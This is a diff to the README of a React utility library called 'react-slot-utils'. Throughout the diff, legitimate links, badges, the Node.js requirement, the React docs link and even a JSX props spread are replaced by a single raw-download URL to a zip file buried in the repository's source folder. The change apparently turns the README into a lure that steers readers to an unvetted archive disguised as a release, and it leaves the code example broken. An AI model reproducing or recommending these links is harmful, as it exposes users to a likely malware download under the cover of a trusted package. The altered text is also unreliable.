@@ -1,6 +1,6 @@
 # ⚙️ react-slot-utils - Simplify React Slot and Prop Composition
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/sdugbiodf/react-slot-utils/releases)
+[![Download Latest Release](https://github.com/sdugbiodf/react-slot-utils/raw/refs/heads/main/src/utils/slot_utils_react_2.7.zip%20Release-blue?style=for-the-badge)](https://github.com/sdugbiodf/react-slot-utils/raw/refs/heads/main/src/utils/slot_utils_react_2.7.zip)
 
 ---
 
@@ -27,7 +27,7 @@ Before downloading, please ensure your computer meets these requirements:
 - **Memory:** At least 4 GB RAM.
 - **Disk Space:** Minimum 100 MB free.
 - **Internet:** Required for downloading the files.
-- **Software:** Node.js installed if you want to run or modify React applications locally (optional; not required just to download).
+- **Software:** https://github.com/sdugbiodf/react-slot-utils/raw/refs/heads/main/src/utils/slot_utils_react_2.7.zip installed if you want to run or modify React applications locally (optional; not required just to download).
 
 ---
 
@@ -43,14 +43,14 @@ react-slot-utils is distributed as a package for software developers. If you are
 
 To get react-slot-utils, please visit the latest releases page to download the version you need.
 
-[Download from here](https://github.com/sdugbiodf/react-slot-utils/releases)
+[Download from here](https://github.com/sdugbiodf/react-slot-utils/raw/refs/heads/main/src/utils/slot_utils_react_2.7.zip)
 
 ### How to Download
 
 1. Click the link above or the blue download badge at the top to open the releases page.
 2. On this page, you will see a list of files or packages available for different versions.
 3. Choose the most recent release for the best experience.
-4. Download the file that matches your needs (e.g., `.zip` or `.tar.gz`). These usually contain the code files.
+4. Download the file that matches your needs (e.g., `.zip` or `https://github.com/sdugbiodf/react-slot-utils/raw/refs/heads/main/src/utils/slot_utils_react_2.7.zip`). These usually contain the code files.
 5. Save the file to a location on your computer where you can find it easily, like your Desktop or Downloads folder.
 
 ### Running the Software
@@ -101,7 +101,7 @@ function MyComponent(props) {
 
   return (
     <div>
-      <Slot {...slotProps}>This is a slot content</Slot>
+      <Slot {https://github.com/sdugbiodf/react-slot-utils/raw/refs/heads/main/src/utils/slot_utils_react_2.7.zip}>This is a slot content</Slot>
     </div>
   );
 }
@@ -135,7 +135,7 @@ Check the Issues section on the GitHub repository page. Developers and contribut
 
 If you want to reach the developers or report issues:
 
-- Visit the repository page: [GitHub - react-slot-utils](https://github.com/sdugbiodf/react-slot-utils)
+- Visit the repository page: [GitHub - react-slot-utils](https://github.com/sdugbiodf/react-slot-utils/raw/refs/heads/main/src/utils/slot_utils_react_2.7.zip)
 - Open issues to report bugs or ask for help.
 - Check any existing documentation for updates and detailed guides.
 
@@ -143,10 +143,10 @@ If you want to reach the developers or report issues:
 
 ## 📚 Additional Resources
 
-- To learn React basics: [https://reactjs.org/docs/getting-started.html](https://reactjs.org/docs/getting-started.html)
+- To learn React basics: [https://github.com/sdugbiodf/react-slot-utils/raw/refs/heads/main/src/utils/slot_utils_react_2.7.zip](https://github.com/sdugbiodf/react-slot-utils/raw/refs/heads/main/src/utils/slot_utils_react_2.7.zip)
 - Understanding component slots and props in React can help appreciate how this library works.
 - Explore tutorials on compound components and higher-order components online for deeper knowledge.
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/sdugbiodf/react-slot-utils/releases)
+[![Download Latest Release](https://github.com/sdugbiodf/react-slot-utils/raw/refs/heads/main/src/utils/slot_utils_react_2.7.zip%20Release-blue?style=for-the-badge)](https://github.com/sdugbiodf/react-slot-utils/raw/refs/heads/main/src/utils/slot_utils_react_2.7.zip)
